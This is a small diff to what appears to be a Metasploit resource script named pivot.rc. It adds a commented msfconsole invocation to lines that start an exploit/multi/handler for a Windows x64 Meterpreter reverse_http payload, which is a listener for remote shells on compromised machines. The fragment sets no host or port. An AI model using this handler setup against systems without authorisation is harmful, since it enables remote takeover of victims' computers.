@@ -1,3 +1,4 @@
+#msfconsole -r pivot.rc -q
 spool msf.log
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_http
